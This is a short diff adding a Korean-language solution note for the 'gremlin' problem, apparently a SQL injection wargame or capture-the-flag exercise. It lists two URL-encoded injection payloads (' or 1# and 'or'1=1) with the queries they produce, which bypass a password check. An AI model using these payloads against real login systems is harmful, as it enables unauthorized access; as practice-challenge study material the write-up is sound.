@@ -1,1 +1,4 @@
-
+gremlin 문제
+<풀이 과정>
+php?pw=%27%20or%201%23 (select id from prob_gremlin where id='' and pw='' or 1#')
+pw=%27or%271=1 (select id from prob_gremlin where id='' and pw=''or'1=1')
